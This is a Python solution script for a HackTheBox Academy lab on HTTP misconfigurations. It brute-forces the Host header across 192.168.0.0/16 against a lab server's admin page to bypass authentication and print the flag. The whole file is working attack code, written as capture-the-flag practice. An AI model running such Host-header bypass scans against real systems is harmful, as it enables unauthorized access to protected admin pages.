#!/usr/bin/env python3

"""
Created this script to solve the HackTheBox Academy lab called 'Authentication Bypass' for the module called 'Abusing HTTP Misconfigurations'. 
This script exploits a host header attack in order to access the admin page.  Since the localhost ip is not known, the script runs through all possibilities on the subnet of 192.168.0.0/16
"""

import time
import requests

proxies={"http":"http://127.0.0.1:8080"}
target="83.136.249.33:39222"

def host_header_attack():
    finished= "No"
    for ip1 in range(0,255):
        if finished == "Yes":
            break
        for ip2 in range(0,255):
            ip= f"192.168.{ip1}.{ip2}"
            headers={"Host":ip}
            response= requests.get(url=f"http://{target}/admin.php", proxies=proxies, headers=headers, allow_redirects=True)
            if "Unauthorized" not in response.text:
                print(f"Found local ip: {ip}")
                for line in response.text.splitlines():
                    if "HTB{" in line:
                        print(line)
                        finished= "Yes"
                        break           
                    else:
                        pass 
                break       
            else:
                pass

try:
    host_header_attack()
except KeyboardInterrupt:
    print("Ctrl + C detected, exiting gracefully")
